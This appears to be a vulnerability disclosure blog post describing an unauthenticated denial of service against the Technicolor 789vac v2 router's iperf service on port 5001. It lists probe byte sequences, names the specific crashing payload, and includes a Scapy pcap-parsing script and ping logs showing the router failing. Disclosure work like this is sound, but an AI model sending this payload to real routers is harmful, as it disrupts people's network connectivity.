---
layout: post
title: "Router Technicolor 789vac v2" 
date: 2025-01-15
comments: "-"
categories: vulnerability
---


## Affected products

```
    Technicolor 789vac v2 - firmware AGTOT_2.0.0
    -------------------------------- AGTOT_2.0.1
    -------------------------------- AGTOT_2.2.3
```

We have not yet tested Technicolor models other than those listed. However we suspect it may also work on other models with similar firmware version higher than 2.0.0.


## Overview

An issue was discovered in the Technicolor 789vac router running firmware AGTOT_2.2.3. An unauthenticated remote attacker can send a crafted probe or perform a service detection scan, targeting the iperf service on port 5001. This triggers an immediate failure in the routerâ€™s network stack, causing disruption of all network connectivity (wired and wireless) and resulting in a full router reboot.

**This PoC can result in a DoS.**

**Given the vendor's policies, we wont't show the Source Code of the binary scripts. However, we'll inspect the web page source. We'll provide the insights before and after the procedure.**

## Strategy

We tested the improper behaviours. 
Simultaneously, we captured the network traffic log all packets exchanged. 
We saved the captured data in PCAPNG format for further analysis. 
Collect all the probes analyzing pcapng (e.g. Scapy)
We filtered precisely the crashing cause by sending one by one and then crafted the exploit.

Here's the list of the probes collected: 
```
Probe #1 BOF: b'\x41' * 10000
Probe #2 Unexpected input from another protocol: b'GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n'
Probe #3: b'\r\n\r\n'
Probe #4 Enumeration: b'\x69\x70\x65\x72\x66\x20\x2d\x76\x00'
Probe #5 unexpected binary sequence: b'\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
```

Probe scraping: 
```
from scapy.all import rdpcap


file_path = 'crash.pcapng'  # Replace with your file path
packets = rdpcap(file_path)

target_ip = "ip_addr" 
target_port = 5001

probes = []
for packet in packets:
    if packet.haslayer("TCP") and packet["TCP"].dport == target_port and packet["IP"].dst == target_ip:
        payload = bytes(packet["TCP"].payload)
        if payload and payload not in probes: 
            probes.append(payload)

for i, probe in enumerate(probes, start=1):
    print(f"Probe #{i}: {probe}")
```

The probe #5 is the chosen one that leads Techicolor 789vac failure. 

```
64 bytes from 192.168.1.1: icmp_seq=183 ttl=64 time=0.401 ms
64 bytes from 192.168.1.1: icmp_seq=184 ttl=64 time=0.348 ms
64 bytes from 192.168.1.1: icmp_seq=185 ttl=64 time=0.384 ms
64 bytes from 192.168.1.1: icmp_seq=186 ttl=64 time=0.373 ms
64 bytes from 192.168.1.1: icmp_seq=187 ttl=64 time=0.335 ms
64 bytes from 192.168.1.1: icmp_seq=188 ttl=64 time=0.349 ms
64 bytes from 192.168.1.1: icmp_seq=189 ttl=64 time=4.66 ms
64 bytes from 192.168.1.1: icmp_seq=190 ttl=64 time=0.518 ms
64 bytes from 192.168.1.1: icmp_seq=191 ttl=64 time=0.385 ms
64 bytes from 192.168.1.1: icmp_seq=192 ttl=64 time=0.418 ms



From 192.168.1.2 icmp_seq=247 Destination Host Unreachable
From 192.168.1.2 icmp_seq=248 Destination Host Unreachable
From 192.168.1.2 icmp_seq=249 Destination Host Unreachable
```
Before the failure (icmp_seq=183 to icmp_seq=188) the latency can be considered low (~0.3-0.4 ms)
During the moment of disruption (icmp_seq=189) there's a sudden spike in response time, which indicates the system is struggling to process the incoming data.
After failure (icmp_seq=190 to icmp_seq=192), the router resumes responding briefly until the total failure (icmp_seq=247 and beyond), becoming unreachable.

Moreover, this will result in an unintended system reboot. The time required for the system to reboot is unpredictable, ranging from a few seconds up to 10 minutes after the actor has exploited the system.
 
